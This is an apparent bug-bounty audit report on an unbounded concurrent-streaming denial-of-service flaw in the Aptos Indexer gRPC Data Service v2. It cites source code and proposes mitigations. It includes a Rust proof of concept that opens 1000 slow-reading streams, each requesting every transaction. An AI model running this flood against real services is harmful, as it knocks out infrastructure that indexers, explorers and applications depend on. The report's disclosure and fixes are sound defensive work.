# Audit Report

## Title
Unbounded Concurrent Streaming Requests Enable Indexer Service Denial of Service

## Summary
The Aptos Indexer gRPC Data Service v2 does not implement rate limiting or concurrent connection limits for streaming `get_transactions()` requests. An attacker can open an unlimited number of concurrent streaming connections, exhausting server memory, CPU, and I/O resources, thereby preventing legitimate indexers from receiving transaction data.

## Finding Description

The vulnerability exists in the gRPC data service implementation where streaming `get_transactions()` requests are accepted and processed without any concurrency controls or rate limiting. [1](#0-0) 

When a client calls `get_transactions()`, the service immediately:
1. Creates a response channel with configurable buffer size (default 5)
2. Sends the request to a handler queue (size 10)
3. Returns a streaming response [2](#0-1) 

The handler queue has only 10 slots, but when full, the `.send().await.unwrap()` call blocks asynchronously rather than rejecting new connections. Meanwhile, both the Historical and Live Data Services spawn unlimited async tasks to process requests: [3](#0-2) [4](#0-3) 

The server configuration lacks HTTP/2 concurrent stream limits: [5](#0-4) 

No authentication, authorization, rate limiting, or connection limiting mechanisms exist in the service layer. Each concurrent stream consumes:
- Response channel buffer memory (5+ TransactionsResponse messages per stream)
- Async task state and stack memory
- CPU cycles for transaction filtering and batch processing
- I/O bandwidth for reading from file storage or cache

An attacker can open hundreds or thousands of concurrent streams, multiplying resource consumption until the service becomes unresponsive.

## Impact Explanation

This qualifies as **High Severity** under Aptos bug bounty criteria as it enables "API crashes" through resource exhaustion. The indexer gRPC service is critical infrastructure that provides transaction data to external indexers, block explorers, and ecosystem applications. 

When the service becomes unavailable:
- Legitimate indexers cannot sync blockchain state
- Block explorers display stale data
- Analytics platforms and dApps lose real-time transaction visibility
- The broader Aptos ecosystem experiences degraded functionality

While this does not directly affect consensus or validator operations, it represents a significant availability attack on essential blockchain infrastructure.

## Likelihood Explanation

The likelihood of exploitation is **HIGH**:

1. **No authentication**: The service appears to be publicly accessible without authentication checks
2. **Trivial exploitation**: Any client can call the gRPC endpoint repeatedly
3. **Low cost**: Attacker only needs minimal bandwidth to establish connections
4. **Immediate effect**: Resource exhaustion occurs quickly as tasks spawn without limits
5. **No monitoring**: No built-in detection of abnormal concurrent connection patterns

An attacker with basic gRPC client knowledge can execute this attack in minutes.

## Recommendation

Implement multiple layers of protection:

**1. HTTP/2 Concurrent Stream Limit:**
```rust
// In config.rs
let mut server_builder = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .http2_max_concurrent_streams(Some(100)); // Add this line
```

**2. Application-Level Concurrency Control:**
Replace unbounded `tokio_scoped::scope` spawning with a bounded executor using semaphores:

```rust
// In historical_data_service.rs and live_data_service/mod.rs
const MAX_CONCURRENT_STREAMS: usize = 100;
let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_STREAMS));

while let Some((request, response_sender)) = handler_rx.blocking_recv() {
    let permit = match semaphore.clone().try_acquire_owned() {
        Ok(permit) => permit,
        Err(_) => {
            let _ = response_sender.blocking_send(Err(
                Status::resource_exhausted("Too many concurrent streams")
            ));
            continue;
        }
    };
    
    scope.spawn(async move {
        let _permit = permit; // Hold permit for duration of stream
        // ... existing processing logic
    });
}
```

**3. Per-Client Rate Limiting:**
Track requests per client IP/identifier and reject excessive requests:

```rust
// Add to service.rs
use std::collections::HashMap;
use std::time::Instant;

struct RateLimiter {
    requests: HashMap<String, (usize, Instant)>,
    max_requests_per_minute: usize,
}

impl RateLimiter {
    fn check_rate_limit(&mut self, client_id: &str) -> Result<(), Status> {
        // Implementation
    }
}
```

**4. Connection Timeout and Idle Detection:**
Implement idle stream detection and automatic cleanup of stale connections.

## Proof of Concept

```rust
// DoS PoC - Opens 1000 concurrent streaming connections
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient,
    GetTransactionsRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target_url = "http://indexer-service:50051"; // Target indexer service
    
    let mut handles = vec![];
    
    // Open 1000 concurrent streams
    for i in 0..1000 {
        let handle = tokio::spawn(async move {
            let mut client = DataServiceClient::connect(target_url).await?;
            
            let request = Request::new(GetTransactionsRequest {
                starting_version: Some(0),
                transactions_count: Some(u64::MAX), // Request all transactions
                batch_size: Some(1000),
                transaction_filter: None,
            });
            
            // Open stream and keep it alive
            let mut stream = client.get_transactions(request).await?.into_inner();
            
            // Read slowly to keep connection open
            while let Some(_response) = stream.message().await? {
                tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
            }
            
            Ok::<(), Box<dyn std::error::Error>>(())
        });
        
        handles.push(handle);
    }
    
    // Wait for all streams (they'll run until server crashes)
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Result**: After launching this PoC, the indexer service will experience:
- Rapid memory growth from channel buffers and task state
- CPU saturation from processing 1000+ concurrent streams
- I/O bottleneck from reading transaction data for all streams
- Service becomes unresponsive to legitimate indexer requests within minutes

## Notes

This vulnerability is in the **indexer gRPC service infrastructure**, not the core consensus or validator nodes. However, it represents a critical availability issue for the Aptos ecosystem's data layer. The service is explicitly mentioned in the security question scope, indicating it is considered security-critical infrastructure.

The issue stems from treating all components with the same trust assumptions without implementing defense-in-depth for publicly exposed APIs. The lack of concurrent request limiting violates the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits."

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/service.rs (L138-149)
```rust
    async fn get_transactions(
        &self,
        req: Request<GetTransactionsRequest>,
    ) -> Result<Response<Self::GetTransactionsStream>, Status> {
        let (tx, rx) = channel(self.data_service_response_channel_size);
        self.handler_tx.send((req, tx)).await.unwrap();

        let output_stream = ReceiverStream::new(rx);
        let response = Response::new(Box::pin(output_stream) as Self::GetTransactionsStream);

        Ok(response)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L123-123)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L251-253)
```rust
        let mut server_builder = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L112-124)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-140)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
            }
```
